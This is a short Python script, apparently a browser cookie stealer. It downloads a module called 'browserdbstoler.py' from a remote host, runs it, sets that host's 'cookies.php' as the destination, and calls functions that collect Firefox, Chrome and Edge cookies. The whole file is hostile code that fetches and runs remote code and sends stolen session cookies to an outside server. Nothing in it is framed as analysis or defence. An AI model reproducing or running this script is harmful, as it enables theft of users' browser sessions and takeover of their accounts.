import urllib.request
import os

HOST = "https://dev.crizacio.com/BrowserDBStoler/"
POST_URL = str("{}cookies.php".format(HOST))
DOWNLOAD_BIN = str("{}browserdbstoler.py".format(HOST))

if not os.path.isfile("browserdbstoler.py"):
    urllib.request.urlretrieve(DOWNLOAD_BIN, "browserdbstoler.py")

import browserdbstoler as bdbs

bdbs.SetServerHostPost(POST_URL)

bdbs.GetFirefoxCookies()

bdbs.GetChromeCookies()

bdbs.GetEdgeCookies()

# bdbs.GetVivaldiCookies()
